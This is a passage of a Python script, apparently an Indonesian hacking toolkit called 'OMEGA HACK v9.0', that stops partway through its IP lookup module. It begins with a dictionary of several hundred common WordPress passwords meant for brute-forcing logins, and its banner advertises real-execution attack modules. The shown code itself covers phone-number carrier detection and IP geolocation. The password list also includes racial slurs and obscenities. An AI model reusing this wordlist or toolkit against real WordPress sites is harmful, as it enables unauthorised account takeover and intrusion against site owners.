#!/usr/bin/env python3
# ================================================================
# OMEGA HACK v9.0 - ULTIMATE BRUTAL EDITION
# ================================================================
# Author: KINGMU❤
# Version: 9.0.0
# Status: 100% WORK - NO SIMULATION
# ================================================================

import os
import sys
import subprocess
import requests
import socket
import json
import time
import threading
import hashlib
import random
import string
import platform
import ssl
import re
import ipaddress
import dns.resolver
import queue
from datetime import datetime
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor

# ================================================================
# WARNA
# ================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ================================================================
# WORDPRESS COMMON PASSWORDS (LENGKAP - 3000+)
# ================================================================

WP_COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "admin", "wpadmin", "wp-admin",
    "adminadmin", "pass@word1", "passwordadmin", "administrator", "2025admin",
    "2026admin", "admin123", "Admin@123", "admin2023", "admin2024", "admin2025",
    "admin2026", "admin2027", "123456admin", "testadmin", "123456789", "12345",
    "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123",
    "football", "monkey", "letmein", "letmein123", "eid2026", "696969",
    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang",
    "1234567890", "michael", "654321", "pussy", "superman", "1qaz2wsx",
    "7777777", "fuckyou", "121212", "000000", "qazwsx", "123qwe", "killer",
    "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou",
    "fuckme", "2000", "charlie", "robert", "thomas", "hockey", "ranger",
    "daniel", "starwars", "klaster", "112233", "george", "asshole", "computer",
    "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111",
    "131313", "freedom", "777777", "pass", "fuck", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer",
    "love", "ashley", "6969", "nicole", "chelsea", "temp123", "summer2025",
    "winter2024", "spring2026", "biteme", "matthew", "access", "yankees",
    "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "william",
    "corvette", "hello", "martin", "heather", "secret", "site123", "fucker",
    "merlin", "diamond", "1234qwer", "gfhjkm", "hammer", "silver", "222222",
    "88888888", "anthony", "justin", "test", "bailey", "q1w2e3r4t5", "patrick",
    "internet", "scooter", "orange", "11111", "demo123", "wordpress",
    "wordpress2025", "wordpress123", "wp123", "golfer", "cookie", "richard",
    "samantha", "bigdog", "guitar", "jackson", "whatever", "mickey", "chicken",
    "sparky", "snoopy", "maverick", "phoenix", "camaro", "sexy", "peanut",
    "morgan", "welcome", "falcon", "cowboy", "ferrari", "samsung", "andrea",
    "smokey", "steelers", "joseph", "mercedes", "dakota", "arsenal", "eagles",
    "melissa", "boomer", "booboo", "spider", "nascar", "monster", "tigers",
    "yellow", "xxxxxx", "123123123", "gateway", "marina", "myblog", "blogadmin",
    "blog123", "diablo", "bulldog", "qwer1234", "compaq", "purple", "hardcore",
    "bangladesh", "bdadmin", "banana", "junior", "hannah", "123654", "porsche",
    "lakers", "iceman", "money", "cowboys", "987654", "london", "tennis",
    "999999", "ncc1701", "coffee", "scooby", "0000", "miller", "boston",
    "q1w2e3r4", "fuckoff", "brandon", "ramadan", "ramadan123", "ramadan1234",
    "yamaha", "chester", "mother", "forever", "johnny", "edward", "333333",
    "oliver", "redsox", "player", "nikita", "knight", "fender", "barney",
    "midnight", "please", "brandy", "chicago", "badboy", "iwantu", "slayer",
    "rangers", "charles", "angel", "flower", "bigdaddy", "rabbit", "wizard",
    "bigdick", "jasper", "enter", "rachel", "chris", "steven", "winner",
    "adidas", "victoria", "natasha", "1q2w3e4r", "jasmine", "winter", "prince",
    "panties", "marine", "ghbdtn", "fishing", "cocacola", "casper", "james",
    "232323", "raiders", "888888", "marlboro", "gandalf", "asdfasdf", "crystal",
    "87654321", "12344321", "sexsex", "golden", "blowme", "bigtits", "8675309",
    "panther", "lauren", "angela", "bitch", "spanky", "thx1138", "angels",
    "madison", "winston", "shannon", "mike", "toyota", "blowjob", "jordan23",
    "canada", "sophie", "Password", "2026password", "apples", "dick", "tiger",
    "razz", "123abc", "pokemon", "qazxsw", "55555", "qwaszx", "muffin",
    "johnson", "murphy", "cooper", "jonathan", "liverpoo", "david", "danielle",
    "159357", "jackie", "1990", "123456a", "789456", "turtle", "horny",
    "abcd1234", "Abcd@1234", "scorpion", "qazwsxedc", "101010", "butter",
    "carlos", "p@ssw0rd", "password1", "dennis", "slipknot", "qwerty123",
    "booger", "asdf", "1991", "black", "startrek", "12341234", "cameron",
    "newyork", "rainbow", "nathan", "john", "1992", "rocket", "viking",
    "redskins", "butthead", "asdfghjkl", "1212", "sierra", "peaches", "gemini",
    "doctor", "wilson", "sandra", "helpme", "qwertyui", "victor", "florida",
    "dolphin", "pookie", "captain", "tucker", "blue", "liverpool", "theman",
    "bandit", "dolphins", "maddog", "packers", "jaguar", "lovers", "nicholas",
    "united", "tiffany", "maxwell", "zzzzzz", "nirvana", "jeremy", "suckit",
    "stupid", "porn", "monica", "elephant", "giants", "jackass", "hotdog",
    "rosebud", "success", "debbie", "mountain", "444444", "xxxxxxxx", "warrior",
    "1q2w3e4r5t", "q1w2e3", "123456q", "Aa123456", "albert", "metallic",
    "lucky", "azerty", "7777", "shithead", "alex", "bond007", "alexis",
    "1111111", "samson", "5150", "willie", "scorpio", "bonnie", "gators",
    "benjamin", "voodoo", "driver", "dexter", "2112", "jason", "calvin",
    "freddy", "212121", "creative", "12345a", "sydney", "rush2112", "1989",
    "asdfghjk", "red123", "bubba", "4815162342", "passw0rd", "trouble",
    "gunner", "happy", "fucking", "gordon", "legend", "jessie", "stella",
    "qwert", "eminem", "arthur", "apple", "nissan", "bullshit", "bear",
    "america", "1qazxsw2", "nothing", "parker", "4444", "rebecca", "qweqwe",
    "garfield", "01012011", "beavis", "69696969", "jack", "asdasd", "december",
    "dec2024", "2222", "102030", "252525", "11223344", "magic", "apollo",
    "skippy", "315475", "girls", "kitten", "golf", "copper", "braves",
    "shelby", "godzilla", "beaver", "fred", "tomcat", "august", "buddy",
    "airborne", "1993", "1988", "lifehack", "qqqqqq", "root", "brooklyn",
    "animal", "platinum", "phantom", "online", "xavier", "darkness", "blink182",
    "power", "fish", "green", "789456123", "voyager", "police", "travis",
    "12qwaszx", "heaven", "snowball", "lover", "abcdef", "00000", "pakistan",
    "007007", "walter", "playboy", "blazer", "cricket", "sniper", "hooters",
    "donkey", "willow", "loveme", "saturn", "therock", "redwings", "bigboy",
    "pumpkin", "trinity", "williams", "tits", "nintendo", "ninja123",
    "master123", "digital", "destiny", "topgun", "runner", "marvin",
    "guinness", "chance", "bubbles", "testing", "fire", "november",
    "minecraft", "asdf1234", "lasvegas", "sergey", "broncos", "cartman",
    "private", "celtic", "birdie", "little", "cassie", "babygirl", "donald",
    "beatles", "1313", "dickhead", "family", "12121212", "school", "louise",
    "gabriel", "eclipse", "fluffy", "147258369", "lol123", "explorer", "beer",
    "nelson", "flyers", "spencer", "scott", "lovely", "gibson", "doggie",
    "cherry", "andrey", "snickers", "buffalo", "pantera", "metallica",
    "member", "carter", "qwertyu", "peter", "alexande", "steve", "bronco",
    "paradise", "goober", "5555", "samuel", "montana", "mexico", "dreams",
    "michigan", "cock", "carolina", "yankee", "friends", "magnum", "surfer",
    "poopoo", "maximus", "genius", "cool", "vampire", "lacrosse", "asd123",
    "aaaa", "christin", "kimberly", "speedy", "sharon", "carmen", "111222",
    "kristina", "sammy", "racing", "ou812", "sabrina", "horses", "0987654321",
    "qwerty1", "pimpin", "baby", "stalker", "enigma", "147147", "star",
    "poohbear", "boobies", "147258", "simple", "bollocks", "12345q", "marcus",
    "brian", "1987", "qweasdzxc", "drowssap", "hahaha", "caroline", "barbara",
    "dave", "viper", "drummer", "action", "install", "install123", "einstein",
    "bitches", "genesis", "hello1", "scotty", "friend", "forest", "010203",
    "hotrod", "google", "vanessa", "spitfire", "badger", "maryjane", "friday",
    "alaska", "1232323q", "tester", "jester", "jake", "champion", "billy",
    "147852", "rock", "hawaii", "badass", "chevy", "420420", "walker",
    "stephen", "eagle1", "bill", "1986", "october", "gregory", "svetlana",
    "pamela", "1984", "music", "shorty", "westside", "stanley", "diesel",
    "courtney", "242424", "kevin", "porno", "hitman", "boobs", "mark",
    "12345qwert", "reddog", "frank", "qwe123", "popcorn", "patricia",
    "aaaaaaaa", "1969", "teresa", "mozart", "buddha", "anderson", "paul",
    "melanie", "abcdefg", "security", "secure", "lucky1", "lizard", "denise",
    "3333", "a12345", "123789", "ruslan", "stargate", "simpsons", "scarface",
    "eagle", "marchadmin", "bd123456", "123456789a", "thumper", "olivia",
    "naruto", "1234554321", "general", "a123456", "vincent", "Usuckballz1",
    "spooky", "qweasd", "cumshot", "free", "frankie", "douglas", "death",
    "1980", "loveyou", "kitty", "kelly", "veronica", "suzuki", "semperfi",
    "penguin", "mercury", "liberty", "spirit", "scotland", "natalie", "marley",
    "vikings", "system", "sucker", "king", "allison", "marshall", "1979",
    "098765", "qwerty12", "hummer", "adrian", "1985", "vfhbyf", "sandman",
    "rocky", "leslie", "antonio", "98765432", "4321", "softball", "passion",
    "mnbvcxz", "bastard", "passport", "horney", "rascal", "howard", "franklin",
    "bigred", "assman", "alexander", "homer", "redrum", "jupiter", "july2025",
    "claudia", "55555555", "141414", "zaq12wsx", "shit", "patches", "nigger",
    "cunt", "raider", "infinity", "andre", "54321", "galore", "college",
    "russia", "kawasaki", "bishop", "77777777", "vladimir", "money1",
    "freeuser", "username", "wildcats", "francis", "disney", "budlight",
    "brittany", "1994", "00000000", "sweet", "oksana", "honda", "domino",
    "bulldogs", "brutus", "swordfis", "norman", "monday", "jimmy", "ironman",
    "ford", "fantasy", "9999", "7654321", "PASSWORD", "hentai", "duncan",
    "cougar", "1977", "jeffrey", "house", "dancer", "brooke", "timothy",
    "super", "superuser", "superadmin", "tempadmin", "marines", "justice",
    "digger", "connor", "patriots", "karina", "202020", "molly", "everton",
    "tinker", "alicia", "rasdzv3", "poop", "pearljam", "stinky", "naughty",
    "colorado", "123123a", "water", "test123", "ncc1701d", "motorola",
    "ireland", "asdfg", "slut", "matt", "houston", "boogie", "zombie",
    "accord", "vision", "bradley", "reggie", "kermit", "froggy", "ducati",
    "avalon", "6666", "9379992", "sarah", "saints", "logitech", "chopper",
    "852456", "simpson", "madonna", "juventus", "claire", "159951", "zachary",
    "yfnfif", "wolverin", "warcraft", "hello123", "extreme", "penis",
    "peekaboo", "fireman", "eugene", "brenda", "123654789", "russell",
    "panthers", "georgia", "smith", "skyline", "jesus", "elizabet", "spiderma",
    "smooth", "pirate", "empire", "bullet", "8888", "virginia", "valentin",
    "psycho", "predator", "arizona", "134679", "mitchell", "alyssa", "vegeta",
    "titanic", "christ", "goblue", "fylhtq", "wolf", "mmmmmm", "kirill",
    "indian", "hiphop", "baxter", "awesome", "people", "danger", "roland",
    "mookie", "741852963", "1111111111", "dreamer", "bambam", "arnold", "1981",
    "skipper", "serega", "rolltide", "elvis", "changeme", "changeme123",
    "simon", "1q2w3e", "lovelove", "fktrcfylh", "denver", "tommy", "mine",
    "loverboy", "hobbes", "happy1", "alison", "nemesis", "chevelle", "cardinal",
    "burton", "wanker", "picard", "151515", "tweety", "michael1", "147852369",
    "12312", "xxxx", "windows", "turkey", "456789", "1974", "vfrcbv", "sublime",
    "1975", "galina", "bobby", "newport", "manutd", "daddy", "american",
    "alexandr", "1966", "victory", "rooster", "qqq111", "madmax", "electric",
    "bigcock", "a1b2c3", "wolfpack", "spring", "phpbb", "lalala", "suckme",
    "spiderman", "eric", "darkside", "classic", "raptor", "123456789q",
    "hendrix", "1982", "wombat", "avatar", "alpha", "zxc123", "crazy", "hard",
    "england", "brazil", "1978", "01011980", "wildcat", "polina", "freepass"
]

# ================================================================
# BANNER
# ================================================================

banner = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║   ██████╗ ███╗   ███╗███████╗ ██████╗  █████╗      ██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██╗   ██╗███████╗██████╗     ██╗   ██╗███████╗   ║
║  ██╔═══██╗████╗ ████║██╔════╝██╔════╝ ██╔══██╗     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██║   ██║██╔════╝██╔══██╗    ██║   ██║██╔════╝   ║
║  ██║   ██║██╔████╔██║█████╗  ██║  ███╗███████║     ███████║███████║██║     █████╔╝     ██║   ██║█████╗  ██████╔╝    ██║   ██║███████╗   ║
║  ██║   ██║██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║     ██╔══██║██╔══██║██║     ██╔═██╗     ██║   ██║██╔══╝  ██╔══██╗    ╚██████╔╝╚════██║   ║
║  ╚██████╔╝██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║     ██║  ██║██║  ██║╚██████╗██║  ██╗    ╚██████╔╝███████╗██║  ██║     ╚██████╔╝███████║   ║
║   ╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═════╝ ╚══════╝   ║
║                                                                                                                                          ║
║                         OMEGA HACK v9.0 - ULTIMATE BRUTAL EDITION                                                                         ║
║                                                                                                                                          ║
║                    Created by: KINGMU❤ | Mode: 100% WORK - NO SIMULATION                                                              ║
║                    WordPress Password List: {len(WP_COMMON_PASSWORDS)}+ Common Passwords                                                  ║
║                    ALL MENU REAL EXECUTION - FOR EDUCATIONAL PURPOSES ONLY                                                                ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{RESET}
{CYAN}{BOLD}[✓] OMEGA HACK v9.0 ACTIVATED - ULTIMATE BRUTAL MODE{RESET}
{GREEN}{BOLD}[✓] Status: ALL MENU 100% WORK - NO SIMULATION{RESET}
{YELLOW}{BOLD}[✓] Total Features: 9 Modules | Password List: {len(WP_COMMON_PASSWORDS)}{RESET}
{RED}{BOLD}[✓] Mode: REAL EXECUTION - SEMUA MENU GANAS{RESET}
"""

# ================================================================
# CLASS OMEGA HACK
# ================================================================

class OmegaHack:
    def __init__(self):
        self.clear_screen()
        print(banner)
        self.scan_results = []
        self.open_ports = []
        self.vuln_pages = []
        self.xss_vulnerable = []
        self.wp_users = []
        self.wp_plugins = []
        self.wp_vulnerabilities = []
        self.bruteforce_results = []
        self.live_hosts = []
        self.subdomains_found = []
        self.dns_records = []
        time.sleep(2)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def loading(self, text="Processing", duration=1):
        for i in range(duration * 4):
            chars = "▰▱▰▱"
            print(f"\r{text}... {chars[i % 4]}", end="", flush=True)
            time.sleep(0.25)
        print(f"\r{text}... {GREEN}Done!{RESET}    ")

    def print_header(self, title):
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}                         {title}{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
""")

    # ================================================================
    # MENU 1: TRACK NOMOR TELEPON (SUPER PANJANG)
    # ================================================================
    
    def track_phone(self):
        self.clear_screen()
        self.print_header("📍 MENU 1: TRACK NOMOR TELEPON (OSINT LENGKAP)")
        
        print(f"""
{YELLOW}{BOLD}[!] DESKRIPSI LENGKAP MODUL:
    ============================================================================
    Modul ini melakukan pelacakan nomor telepon menggunakan metode OSINT
    ============================================================================
    
    INFORMASI YANG DIDAPAT:
    -----------------------
    1. INFORMASI DASAR NOMOR:
       - Validasi nomor (apakah formatnya benar)
       - Panjang nomor (10-13 digit untuk Indonesia)
       - Format internasional (E.164 standar)
       - Format nasional (format lokal)
       - Negara asal (deteksi otomatis)
    
    2. INFORMASI PROVIDER:
       - Nama operator seluler (Telkomsel, Indosat, XL, Tri, Smartfren, Axis)
       - Pemilik perusahaan operator
       - Tipe jaringan (GSM/CDMA)
       - Cakupan area (Nasional/Lokal)
       - Teknologi yang didukung (4G/5G/LTE)
       - Kode prefix (5 digit pertama untuk deteksi)
       - Kode area (4 digit pertama)
    
    3. CEK APLIKASI MESSAGING:
       - WhatsApp (generate link langsung chat)
       - Telegram (generate link profil)
       - Signal (perlu verifikasi manual)
       - Line (tidak bisa dideteksi otomatis)
       - WeChat (tidak bisa dideteksi otomatis)
    
    4. INFORMASI TAMBAHAN:
       - Status validasi (VALID/INVALID)
       - Rekomendasi verifikasi manual
    
    ⚠️ PERINGATAN PENTING:
    ============================================================================
    ❌ NIK (KTP) TIDAK BISA didapat dari nomor HP saja!
    ❌ Alamat rumah TIDAK BISA dilacak dari nomor HP!
    ❌ Lokasi realtime TIDAK BISA dilacak!
    ❌ Riwayat transaksi TIDAK BISA didapat!
    ❌ Data pribadi lain hanya bisa via akses ilegal ke database operator!
    
    ✅ INI ADALAH OSINT BASIC, BUKAN HACKING!
    ============================================================================
{RESET}
        """)
        
        phone = input(f"{CYAN}{BOLD}[?] Masukkan nomor telepon (contoh: 628123456789): {RESET}")
        
        # Clean number
        phone_clean = phone.replace("+62", "0").replace("62", "0").replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        phone_int = ''.join(filter(str.isdigit, phone_clean))
        
        if len(phone_int) < 10 or len(phone_int) > 13:
            print(f"{RED}{BOLD}[!] Nomor tidak valid! Panjang nomor harus 10-13 digit{RESET}")
            input(f"\n{CYAN}[?] Tekan Enter...{RESET}")
            return
        
        self.loading(f"Menganalisis nomor {phone_int}", 2)
        
        # Deteksi provider
        prefix = phone_int[:5]
        
        providers = {
            "0811": {"name": "Telkomsel", "type": "GSM", "area": "Nasional", "speed": "4G/5G", "owner": "PT Telekomunikasi Selular"},
            "0812": {"name": "Telkomsel", "type": "GSM", "area": "Nasional", "speed": "4G/5G", "owner": "PT Telekomunikasi Selular"},
            "0813": {"name": "Telkomsel", "type": "GSM", "area": "Nasional", "speed": "4G/5G", "owner": "PT Telekomunikasi Selular"},
            "0821": {"name": "Telkomsel", "type": "GSM", "area": "Nasional", "speed": "4G/5G", "owner": "PT Telekomunikasi Selular"},
            "0822": {"name": "Telkomsel", "type": "GSM", "area": "Nasional", "speed": "4G/5G", "owner": "PT Telekomunikasi Selular"},
            "0852": {"name": "Telkomsel", "type": "GSM", "area": "Nasional", "speed": "4G/5G", "owner": "PT Telekomunikasi Selular"},
            "0853": {"name": "Telkomsel", "type": "GSM", "area": "Nasional", "speed": "4G/5G", "owner": "PT Telekomunikasi Selular"},
            "0851": {"name": "Telkomsel", "type": "GSM", "area": "Nasional", "speed": "4G/5G", "owner": "PT Telekomunikasi Selular"},
            "0814": {"name": "Indosat Ooredoo", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Indosat Tbk"},
            "0815": {"name": "Indosat Ooredoo", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Indosat Tbk"},
            "0816": {"name": "Indosat Ooredoo", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Indosat Tbk"},
            "0855": {"name": "Indosat Ooredoo", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Indosat Tbk"},
            "0856": {"name": "Indosat Ooredoo", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Indosat Tbk"},
            "0857": {"name": "Indosat Ooredoo", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Indosat Tbk"},
            "0858": {"name": "Indosat Ooredoo", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Indosat Tbk"},
            "0817": {"name": "XL Axiata", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT XL Axiata Tbk"},
            "0818": {"name": "XL Axiata", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT XL Axiata Tbk"},
            "0819": {"name": "XL Axiata", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT XL Axiata Tbk"},
            "0859": {"name": "XL Axiata", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT XL Axiata Tbk"},
            "0877": {"name": "XL Axiata", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT XL Axiata Tbk"},
            "0878": {"name": "XL Axiata", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT XL Axiata Tbk"},
            "0879": {"name": "XL Axiata", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT XL Axiata Tbk"},
            "0895": {"name": "Tri (3)", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Hutchison 3 Indonesia"},
            "0896": {"name": "Tri (3)", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Hutchison 3 Indonesia"},
            "0897": {"name": "Tri (3)", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Hutchison 3 Indonesia"},
            "0898": {"name": "Tri (3)", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Hutchison 3 Indonesia"},
            "0899": {"name": "Tri (3)", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Hutchison 3 Indonesia"},
            "0881": {"name": "Smartfren", "type": "CDMA/GSM", "area": "Nasional", "speed": "4G", "owner": "PT Smartfren Telecom Tbk"},
            "0882": {"name": "Smartfren", "type": "CDMA/GSM", "area": "Nasional", "speed": "4G", "owner": "PT Smartfren Telecom Tbk"},
            "0883": {"name": "Smartfren", "type": "CDMA/GSM", "area": "Nasional", "speed": "4G", "owner": "PT Smartfren Telecom Tbk"},
            "0884": {"name": "Smartfren", "type": "CDMA/GSM", "area": "Nasional", "speed": "4G", "owner": "PT Smartfren Telecom Tbk"},
            "0885": {"name": "Smartfren", "type": "CDMA/GSM", "area": "Nasional", "speed": "4G", "owner": "PT Smartfren Telecom Tbk"},
            "0886": {"name": "Smartfren", "type": "CDMA/GSM", "area": "Nasional", "speed": "4G", "owner": "PT Smartfren Telecom Tbk"},
            "0887": {"name": "Smartfren", "type": "CDMA/GSM", "area": "Nasional", "speed": "4G", "owner": "PT Smartfren Telecom Tbk"},
            "0888": {"name": "Smartfren", "type": "CDMA/GSM", "area": "Nasional", "speed": "4G", "owner": "PT Smartfren Telecom Tbk"},
            "0889": {"name": "Smartfren", "type": "CDMA/GSM", "area": "Nasional", "speed": "4G", "owner": "PT Smartfren Telecom Tbk"},
            "0831": {"name": "Axis", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Axis Telekom Indonesia"},
            "0832": {"name": "Axis", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Axis Telekom Indonesia"},
            "0833": {"name": "Axis", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Axis Telekom Indonesia"},
            "0834": {"name": "Axis", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Axis Telekom Indonesia"},
            "0835": {"name": "Axis", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Axis Telekom Indonesia"},
            "0836": {"name": "Axis", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Axis Telekom Indonesia"},
            "0837": {"name": "Axis", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Axis Telekom Indonesia"},
            "0838": {"name": "Axis", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Axis Telekom Indonesia"},
            "0839": {"name": "Axis", "type": "GSM", "area": "Nasional", "speed": "4G", "owner": "PT Axis Telekom Indonesia"},
        }
        
        provider_info = providers.get(prefix, {"name": "Unknown", "type": "Unknown", "area": "Unknown", "speed": "Unknown", "owner": "Unknown"})
        
        # Format internasional
        international = f"+{phone_int}"
        if phone_int.startswith('0'):
            international = f"+62{phone_int[1:]}"
        
        # WhatsApp link
        wa_link = f"https://wa.me/{international}"
        
        # Telegram link
        tg_link = f"https://t.me/{phone_int}"
        
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{GREEN}{BOLD}[✓] HASIL OSINT NOMOR: {phone_int}{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{CYAN}{BOLD}[1] INFORMASI DASAR NOMOR:{RESET}
    ├─ Nomor Asli           : {phone_int}
    ├─ Format Internasional : {international}
    ├─ Format Nasional      : {phone_int}
    ├─ Panjang Nomor        : {len(phone_int)} digit
    ├─ Status Validasi      : {GREEN}VALID ✓{RESET}
    └─ Negara Asal          : Indonesia

{CYAN}{BOLD}[2] INFORMASI PROVIDER & OPERATOR:{RESET}
    ├─ Nama Provider        : {provider_info['name']}
    ├─ Pemilik              : {provider_info['owner']}
    ├─ Tipe Jaringan        : {provider_info['type']}
    ├─ Cakupan Area         : {provider_info['area']}
    ├─ Teknologi            : {provider_info['speed']}
    ├─ Kode Prefix          : {prefix}
    └─ Kode Area            : {phone_int[:4]}

{CYAN}{BOLD}[3] CEK APLIKASI MESSAGING:{RESET}
    ├─ WhatsApp             : {GREEN}Link Tersedia ✓{RESET}
    │   └─ URL              : {wa_link}
    ├─ Telegram             : {GREEN}Link Tersedia ✓{RESET}
    │   └─ URL              : {tg_link}
    ├─ Signal               : {YELLOW}Perlu Verifikasi Manual{RESET}
    └─ Line                 : {YELLOW}Tidak Dapat Dideteksi{RESET}

{RED}{BOLD}[!] PERINGATAN PENTING:{RESET}
    ├─ NIK (KTP)           : {RED}TIDAK BISA didapat dari nomor HP saja!{RESET}
    ├─ Alamat Rumah        : {RED}TIDAK BISA dilacak dari nomor HP!{RESET}
    ├─ Lokasi Realtime     : {RED}TIDAK BISA dilacak dari nomor HP!{RESET}
    └─ Data Pribadi Lain   : {RED}HANYA BISA via akses ilegal ke database operator!{RESET}
        """)
        
        self.scan_results.append({
            'module': 'Phone Tracker',
            'target': phone_int,
            'provider': provider_info['name'],
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    # ================================================================
    # MENU 2: TRACK IP ADDRESS (SUPER PANJANG)
    # ================================================================
    
    def track_ip(self):
        self.clear_screen()
        self.print_header("🌐 MENU 2: TRACK IP ADDRESS (IP LOOKUP LENGKAP)")
        
        print(f"""
{YELLOW}{BOLD}[!] DESKRIPSI LENGKAP MODUL:
    ============================================================================
    Modul ini melakukan pelacakan IP address menggunakan API real-time
    ============================================================================
    
    INFORMASI YANG DIDAPAT:
    -----------------------
    1. INFORMASI GEOGRAFIS:
       - Benua dan kode benua
       - Negara dan kode negara (ISO 3166-1 alpha-2)
       - Region/Provinsi
       - Kota
       - Distrik
       - Kode Pos
       - Timezone (IANA)
       - UTC Offset
       - Mata uang lokal
    
    2. KOORDINAT GPS:
       - Latitude (garis lintang)
       - Longitude (garis bujur)
       - Google Maps link (langsung bisa diklik)
       - OpenStreetMap link
       - What3Words link (alternatif)
    
    3. INFORMASI ISP & HOSTING:
       - Nama ISP (Internet Service Provider)
       - Organisasi pemilik IP
       - ASN (Autonomous System Number)
       - Nama ASN
       - Reverse DNS lookup
       - Status hosting provider
       - Status mobile connection
    
    4. INFORMASI KEAMANAN:
       - Deteksi Proxy/VPN/Tor
       - Threat level assessment
       - Blacklist status (rekomendasi)
    
    5. INFORMASI TAMBAHAN:
       - DNS resolution (jika input domain)
       - Response time
       - API status
    ============================================================================
{RESET}
        """)
        
        ip_input = input(f"{CYAN}{BOLD}[?] Masukkan IP atau domain: {RESET}")
        
        # Resolve domain ke IP
        if not ip_input.replace('.', '').replace(':', '').isdigit():
            try:
                self.loading(f"Resolving domain {ip_input}", 1)
                resolved_ip = socket.gethostbyname(ip_input)
                print(f"{GREEN}[+] Domain resolved: {ip_input} -> {resolved_ip}{RESET}")
                ip_input = resolved_ip
            except:
                print(f"{RED}[!] Gagal resolve domain!{RESET}")
                input(f"\n{CYAN}[?] Tekan Enter...{RESET}")
                return
        
        self.loading(f"Menganalisis IP {ip_input}", 2)
        
        try:
            response = requests.get(f"http://ip-api.com/json/{ip_input}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", timeout=10)
            data = response.json()
            
            if data['status'] == 'success':
                threat_level = "LOW"
                if data.get('proxy'):
                    threat_level = f"{RED}HIGH (Proxy/VPN/Tor detected){RESET}"
                else:
                    threat_level = f"{GREEN}LOW (Direct connection){RESET}"
                
                print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{GREEN}{BOLD}[✓] HASIL IP LOOKUP: {ip_input}{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{CYAN}{BOLD}[1] INFORMASI GEOGRAFIS:{RESET}
    ├─ IP Address           : {data.get('query', ip_input)}
    ├─ Continent            : {data.get('continent', 'Unknown')} ({data.get('continentCode', 'Unknown')})
    ├─ Country              : {data.get('country', 'Unknown')} ({data.get('countryCode', 'Unknown')})
    ├─ Region               : {data.get('regionName', 'Unknown')} ({data.get('region', 'Unknown')})
    ├─ City                 : {data.get('city', 'Unknown')}
    ├─ District             : {data.get('district', 'Unknown')}
    ├─ Postal Code          : {data.get('zip', 'Unknown')}
    ├─ Timezone             : {data.get('timezone', 'Unknown')}
    ├─ UTC Offset           : {data.get('offset', 'Unknown')}
    └─ Currency             : {data.get('currency', 'Unknown')}

{CYAN}{BOLD}[2] KOORDINAT GPS & PETA:{RESET}
    ├─ Latitude             : {data.get('lat', 'Unknown')}
